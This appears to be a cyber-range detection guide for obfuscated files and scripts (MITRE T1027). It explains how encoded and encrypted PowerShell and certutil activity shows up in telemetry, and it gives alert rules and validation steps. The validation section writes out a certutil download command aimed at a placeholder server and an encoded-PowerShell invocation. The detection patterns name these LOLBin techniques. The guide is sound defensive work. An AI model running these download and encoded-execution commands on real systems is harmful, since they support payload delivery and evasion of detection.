# T1027 / T1027.013 — Obfuscated Files or Information

**Range surface:** scenario SC-09 — encoding/encryption steps executed
through the framework shell. The implant ships none of this (scope
line; the one build-time hardening option, garble, is off by default
and documented in finalization-plan Phase 2).

## What the range does

The operator demonstrates the classic obfuscation ladder in the shell:
base64 (`certutil -decode`, `powershell -enc`), string-encrypted
payloads decrypt-and-eval, archive-wrapped droppers. Each step's
telemetry is the takeaway.

## What is honestly visible

- **Encoding is free to decode and free to see**: `powershell -enc`
  command lines carry the base64 blob (Sysmon EID 1);
  `certutil -decode` is process telemetry (rule below).
- **Encryption is the point**: content telemetry dies. What remains is
  *shape* — entropy of written files (EID 11 + entropy in EDR),
  script-block logging catching the decrypt-and-eval moment (EID 4104
  before blinding), and the loader lineage.
- T1027.013 (encrypted/encoded *script*) lands exactly at the boundary:
  visible on the command line in delivery form, invisible after the
  decrypt step.

## What to alert on

- **Sigma** `0caa33c9-b9da-43ae-ab46-068318375644`
  (2026-lolbin-certutil-download.yml): certutil with
  urlcache/decode/encode flags.
- Hunt: `powershell.exe -enc` / `-w hidden -enc` command-line shapes
  (straightforward EID 1 rule in your SIEM; not shipped here because
  it is a two-line variant of the spawns-shell rule).
- EDR: file-entropy alerts on droppers, script-block decode failures.

## False-positive profile

- certutil is a daily admin tool in enterprises (the urlcache/decode
  flags are the discriminator, plus C2 lineage).
- Encoded-command PowerShell is common in legitimate automation —
  weigh against deployment baselines.

## Validation

1. In the shell: `certutil -urlcache -f http://<server>/sample.bin
   out.bin` — expect the certutil rule.
2. `powershell -enc <base64 of whoami>` — expect EID 1 with the blob;
   decode it and reconcile with script-block telemetry.
3. Record which steps stayed visible end-to-end vs. went dark after
   encryption — that boundary is the T1027 takeaway.
